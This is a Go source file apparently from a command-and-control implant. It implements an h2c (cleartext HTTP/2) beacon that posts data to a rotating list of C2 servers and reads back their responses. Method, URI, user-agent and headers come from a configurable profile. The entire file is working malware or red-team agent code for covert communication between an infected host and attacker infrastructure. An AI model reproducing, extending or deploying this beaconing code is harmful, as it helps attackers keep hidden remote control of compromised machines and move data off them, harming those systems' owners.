//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"time"
)

var h2cTransport = h2cTransportNew()

// h2cTransportNew builds a net/http transport that speaks HTTP/2 prior
// knowledge ("h2c") over plain TCP for http:// URLs — the wire format the
// server's h2c listener expects — without reaching for the deprecated
// http2.Transport family (net/http gained first-class unencrypted HTTP/2
// via Transport.Protocols in Go 1.24). The 30s dialer cap keeps the old
// net.DialTimeout bound so a stalled SYN is not retried forever.
func h2cTransportNew() *http.Transport {
	// Protocols starts nil (defaults); construct it and allow exactly the
	// unencrypted-HTTP/2 protocol — no HTTP/1 fallback, like the old
	// AllowHTTP-only transport.
	tr := &http.Transport{Protocols: new(http.Protocols)}
	tr.Protocols.SetUnencryptedHTTP2(true)
	tr.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
		return (&net.Dialer{Timeout: 30 * time.Second}).DialContext(ctx, network, addr)
	}
	return tr
}

var h2cClient = &http.Client{
	Transport: h2cTransport,
	Timeout:   30 * time.Second,
}

func sendH2CBeacon(body []byte) []byte {
	startIdx := int(currentC2Idx.Load())
	urls := c2URLsSnapshot()
	for i := 0; i < len(urls); i++ {
		idx := (startIdx + i) % len(urls)
		c2URL := urls[idx]

		if !strings.HasPrefix(c2URL, "h2c://") {
			continue
		}

		httpURL := "http://" + strings.TrimPrefix(c2URL, "h2c://")

		method := getActiveBeaconMethodFromConfig()
		if method == "" {
			method = "POST"
		}
		req, err := http.NewRequest(method, httpURL+getActiveBeaconURIFromConfig(), bytes.NewReader(body))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", getActiveUserAgentFromConfig())
		for k, v := range getActiveHeaders() {
			if strings.EqualFold(k, "Content-Type") || strings.EqualFold(k, "User-Agent") {
				continue
			}
			req.Header.Set(k, v)
		}

		// h2cTransport speaks HTTP/2 prior knowledge over plain TCP for
		// http:// URLs (UnencryptedHTTP2 protocol), so no HTTP/1.1 Upgrade
		// headers are needed or honored.

		resp, err := h2cClient.Do(req)
		if err != nil {
			if Debug {
				fmt.Printf("[!] H2C beacon to %s failed: %v\n", c2URL, err)
			}
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode != 200 {
			if Debug {
				fmt.Printf("[!] H2C %s returned %d\n", c2URL, resp.StatusCode)
			}
			continue
		}

		data, err := io.ReadAll(resp.Body)
		if err != nil {
			continue
		}
		currentC2Idx.Store(int32(idx))
		if Debug {
			fmt.Printf("[+] H2C Beacon OK from %s, response %d bytes\n", c2URL, len(data))
		}
		return data
	}
	return nil
}
